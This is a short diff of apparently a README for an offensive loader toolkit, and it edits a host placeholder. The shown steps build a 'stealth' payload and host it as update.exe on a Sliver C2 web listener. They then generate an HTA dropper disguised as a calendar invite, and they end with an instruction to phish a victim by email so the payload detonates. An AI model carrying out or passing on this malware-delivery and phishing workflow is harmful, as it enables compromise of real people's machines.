@@ -74,7 +74,7 @@ cd /opt/Sliver_Loader
 ./build_hybrid_stealth.sh
 sliver > websites add-content --website mysite --web-path /download/update.exe --content /opt/Sliver_Loader/ACTUAL_FILENAME.exe --content-type application/octet-stream
 sliver > http --website mysite --lhost your-server --lport 80
-./hta_generator.py -m 1 -H YOUR_IP/download/ -f update.exe -o calendar_invite.hta
+./hta_generator.py -m 1 -H your-server/download/ -f update.exe -o calendar_invite.hta
 
 Victim Machine
 Phish victim with .HTA via email to detonate the payload
